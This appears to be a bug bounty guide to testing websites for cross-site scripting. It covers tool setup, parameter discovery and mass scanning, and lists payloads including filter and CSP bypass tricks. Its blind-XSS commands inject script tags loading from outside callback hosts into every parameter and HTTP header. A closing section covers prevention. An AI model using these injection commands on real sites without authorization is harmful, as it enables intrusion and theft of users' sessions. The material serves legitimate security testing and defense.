# XSS (Cross-Site Scripting)

> Comprehensive XSS testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users, leading to session theft, keylogging, defacement, or phishing. This guide covers modern XSS testing methodology, tools, and bypass techniques based on OWASP XSS Prevention Cheat Sheet, PortSwigger XSS Cheat Sheet (2026 Edition), and recent bug bounty trends.

## XSS Types

| Type | Description | Testing Focus |
|------|-------------|---------------|
| **Reflected XSS** | Payload in URL/query reflected immediately (search, errors, redirects) | URL parameters, form inputs, error messages |
| **Stored/Persistent XSS** | Payload stored (comments, profiles, forums, tickets) and rendered for others | User-generated content, file uploads, CMS features |
| **DOM-based XSS** | Client-side JS manipulates DOM using untrusted sources into sinks | `location.hash`, `document.referrer`, `window.name`, `localStorage` |
| **mXSS / Mutation XSS** | Browser parsing quirks mutate safe content into executable | HTML sanitizer bypass, parser inconsistencies |
| **Blind XSS** | Payload executes in admin panels, logs, support tools (no direct feedback) | Log viewing interfaces, admin dashboards, support tickets |

## Methodology

### 1. Target & Input Identification
- **Common vulnerable parameter names:** `q=`, `search=`, `query=`, `page=`, `keywords=`, `lang=`, `email=`, `type=`, `name=`, `id=`, `item=`, `url=`, `terms=`, `categoryid=`, `key=`, `callback=`, `jsonp=`
- **Additional input sources:** Headers (`User-Agent`, `Referer`, `X-Forwarded-For`), Cookies (if reflected), JSON responses, file metadata/SVG uploads, PostMessage/WebSocket data
- **Context detection:** HTML context, Attribute context, JavaScript context, CSS context, JSON context

### 2. Tool Installation & Setup

```bash
# Install XSS testing tools
go install github.com/hahwul/dalfox/v2@latest          # Parameter-aware XSS scanner
pip3 install xsstrike                                   # Advanced XSS scanner with WAF evasion
go install github.com/jaeles-project/gospider@latest   # Web crawling for parameter discovery
go install github.com/tomnomnom/waybackurls@latest     # Historical URL extraction
go install github.com/tomnomnom/qsreplace@latest       # Query string replacement
go install github.com/tomnomnom/gf@latest              # Pattern matching
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest  # DAST scanning
```

### 3. Parameter Extraction & Enumeration

```bash
# Extract URLs with parameters from crawl results
grep "?" crawledurls.txt > paramurls.txt

# Extract parameters from JavaScript files
cat jsfiles.txt | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | sort -u > js-params.txt

# Use Gospider for dynamic parameter discovery
gospider -s https://target.com -o gospider_out -c 10 -d 2 --other-source

# Extract URLs from Wayback Machine
waybackurls target.com | tee wayback.txt
```

### 4. GF Pattern Matching for XSS

```bash
# Filter potential XSS vectors using gf patterns
gf xss paramurls.txt > gf-xss.txt

# Custom pattern for JSONP endpoints
gf jsonp paramurls.txt > jsonp-urls.txt
```

### 5. XSS Testing with Dalfox (Automated)

```bash
# Basic scan with callback for blind XSS detection
cat gf-xss.txt | dalfox pipe --blind https://your-callback.xss.ht -o dalfox-results.txt

# Advanced scan with WAF bypass techniques
cat gf-xss.txt | dalfox pipe --skip-bav --skip-mining-all --waf-evasion > advanced-results.txt
grep -i "vulnerable" advanced-results.txt

# Mass scan with custom payloads
cat gf-xss.txt | dalfox pipe -p /path/to/custom-payloads.txt --multicast --delay 300 > mass-results.txt
```

### 6. Manual Testing with Curl & Custom Payloads

```bash
# Test HTML context with basic payloads
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep -i "script\|alert"

# Test attribute context
curl -s "https://target.com/profile?name=\" onmouseover=\"alert(1)" | grep -i "onmouseover\|alert"

# Test JavaScript context
curl -s "https://target.com/api?callback=alert(1)//" | grep -i "alert\|callback"

# Test with encoding bypass
curl -sG "https://target.com/search" --data-urlencode "q=<svg onload=alert(1)>" | grep -i "svg\|alert"
```

### 7. Blind XSS Hunting

```bash
# Inject blind XSS payloads into all parameters
cat gf-xss.txt | qsreplace '"><script src=https://xss.report/c/oddmystic></script>' | httpx -silent -sc -title -cl -location

# User-Agent based blind XSS
cat https-subs.txt | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" -silent

# Referer header injection
httpx -l https-subs.txt -mc 200 -silent | httpx -H 'Referer: "><script src=https://xss.report/c/oddmystic></script>' -H 'User-Agent: Mozilla/5.0' -status-code -title -content-length
```

### 8. XSS Polyglot & Universal Payloads

```bash
# Test with polyglot payload (works in multiple contexts)
cat gf-xss.txt | qsreplace 'jaVasCript:/*-/*`/*\`/*'\''/*"/* */(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e' | httpx -silent -mr "(oNcliCk|oNloAd|jaVasCript|alert\(|svg)" -mc 200

# SVG-based XSS payload
cat gf-xss.txt | qsreplace '<svg onload=alert(1)>' | httpx -silent -mr "svg\|alert" -mc 200
```

### 9. DOM-based XSS Testing

```bash
# Extract JavaScript files and analyze for DOM sinks
cat jsfiles.txt | grep -n "innerHTML\|outerHTML\|document\.write\|eval\|setTimeout\|location\.hash" > dom-sinks.txt

# Test hash-based DOM XSS
curl -s "https://target.com/page.html#<img src=x onerror=alert(1)>" | grep -i "img\|onerror"

# PostMessage testing
echo 'window.postMessage("payload","*")' | xargs -I {} curl -X POST https://target.com/api/message -d 'message={}'
```

### 10. Mass XSS Scanning with Nuclei DAST

```bash
# Scan with Nuclei's XSS templates
nuclei -l gf-xss.txt -t dast/vulnerabilities/xss/ -dast -c 50 -rl 100 -retries 2 -o nuclei-dast-xss.txt

# Include custom templates
nuclei -l gf-xss.txt -t ~/nuclei-templates/custom-xss/ -dast -severity high,critical -o custom-nuclei.txt
```

## Advanced Techniques (2025–2026 Trends)

### WAF Bypass Techniques
- **Hex/Unicode encoding:** `%3Cscript%3Ealert(1)%3C/script%3E`, `\u003cscript\u003ealert(1)\u003c/script\u003e`
- **Comment tricks:** `<!--><script>alert(1)</script>`
- **Nested tags:** `<scr<script>ipt>alert(1)</scr<script>ipt>`
- **Hex overflow:** Overlong UTF-8 sequences to confuse regex-based WAFs
- **Case variation:** `<ScRiPt>alert(1)</sCrIpT>`

### CSP Bypass Techniques
- **Unsafe directives:** `script-src 'unsafe-inline' 'unsafe-eval'`
- **Google Tag Manager / Analytics abuse:** Dangling markup, JSONP-like endpoints
- **JSONP endpoints, data: URIs, blob:, event handlers**
- **Strict CSP bypass:** Report-uri abuse, nonce/strict-dynamic bypass if weak
- **Dangling markup injection:** Force parser to interpret as script

### Framework-specific XSS
- **AngularJS:** `{{constructor.constructor('alert(1)')()}}`, sandbox escapes
- **React:** `dangerouslySetInnerHTML` without sanitization
- **Vue.js:** `v-html` directive with unsanitized input
- **jQuery:** `$().html()`, `$().append()` with user input

### Mutation XSS (mXSS)
- **innerHTML + sanitizer quirks:** Test with specially crafted HTML that browsers reinterpret
- **SVG/MathML parsing differences:** `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
- **Backtick escaping:** `` `alert`1`` in template literals

## Prevention & Defense (Developer Perspective)

### Output Encoding Contexts
- **HTML context:** Encode `<` as `&lt;`, `>` as `&gt;`, `&` as `&amp;`
- **HTML attribute context:** Encode `"` as `&quot;`, `'` as `&#x27;`
- **JavaScript context:** Use `\xHH` encoding or Unicode `\uXXXX`
- **CSS context:** Encode with `\HH` or `\HHHHHH` format
- **URL context:** Percent-encode with `%HH`

### Safe Sinks & Dangerous APIs
- **Safe:** `textContent`, `setAttribute` (safe attributes), `value`, `createTextNode`
- **Dangerous:** `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with string, `location.assign` with `javascript:`

### Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123' 'strict-dynamic'; object-src 'none'; base-uri 'self';
```

### Recommended Libraries
- **HTML Sanitization:** DOMPurify, js-xss, HTMLSanitizer
- **Output Encoding:** OWASP Java Encoder, PHP htmlspecialchars, Python bleach
- **Framework protection:** React DOM escape, Angular sanitization, Vue template compilation

## References

- **PortSwigger XSS Cheat Sheet (2026 Edition):** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **PayloadsAllTheThings – XSS Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- **OWASP DOM-based XSS Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- **XSS Filter Evasion Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- **Web-Vulnerability-Testing-Checklist XSS.md:** ../Web-Vulnerability-Testing-Checklist/XSS.md

## Tool References
- **Dalfox:** https://github.com/hahwul/dalfox
- **XSStrike:** https://github.com/s0md3v/XSStrike
- **Nuclei:** https://github.com/projectdiscovery/nuclei
- **GF Patterns:** https://github.com/tomnomnom/gf

---

**Happy (ethical) hunting — XSS still dominates bug bounties in 2026 (blind, DOM, CSP bypass chains pay big)!**
